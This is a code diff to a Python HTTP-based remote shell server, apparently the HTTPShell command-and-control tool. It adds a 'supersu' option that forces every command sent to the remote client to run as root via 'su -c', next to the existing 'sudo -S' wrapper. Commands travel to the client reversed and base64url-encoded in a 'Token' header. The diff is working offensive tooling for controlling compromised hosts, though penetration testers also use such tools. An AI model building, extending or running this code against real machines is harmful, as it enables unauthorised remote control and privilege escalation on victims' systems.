@@ -14,6 +14,7 @@ from sys import argv
 from neotermcolor import colored
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
+supersu = False
 cmd_response = True
 sudo = False ; root = False
 command = None ; prompt = None
@@ -145,6 +146,13 @@ class MyServer(BaseHTTPRequestHandler):
                         os.system("clear")
                         command = None
 
+                    if "supersu" in command.split()[0]:
+                        global supersu
+                        supersu = True
+                        command = None
+                        root = True
+                        print()
+
                     if "sudo" in command.split()[0]:
                         if not ":" in path:
                             args = oslex.split(command)
@@ -209,6 +217,7 @@ class MyServer(BaseHTTPRequestHandler):
                         print(colored("    upload: Upload a file from local to remote computer","blue"))
                         print(colored("    download: Download a file from remote to local computer","blue"))
                         print(colored("    import-ps1: Import PowerShell script on Windows hosts","blue"))
+                        print(colored("    supersu: Force all commands to be executed as root","blue"))
                         print(colored("    clear/cls: Clear terminal screen","blue"))
                         print(colored("    kill: Kill client connection","blue"))
                         print(colored("    exit: Exit from program\n","blue"))
@@ -220,8 +229,12 @@ class MyServer(BaseHTTPRequestHandler):
 
                         if root and not "cd" in command:
                             if not wait_for_cmd and not "exit" in command:
-                                old_cmd = command
-                                command = str("printf 'HTTPShellNull'" + " | " + "sudo -S " + old_cmd)
+                                if supersu:
+                                    old_cmd = command
+                                    command = str("printf 'HTTPShellNull'" + " | " + "su -c " + '"' + old_cmd + '"')
+                                if not supersu:
+                                    old_cmd = command
+                                    command = str("printf 'HTTPShellNull'" + " | " + "sudo -S " + '"' + old_cmd + '"')
 
                 encoded_command = "Token: "
                 encoded_command += self.encode_reversed_base64url(command)
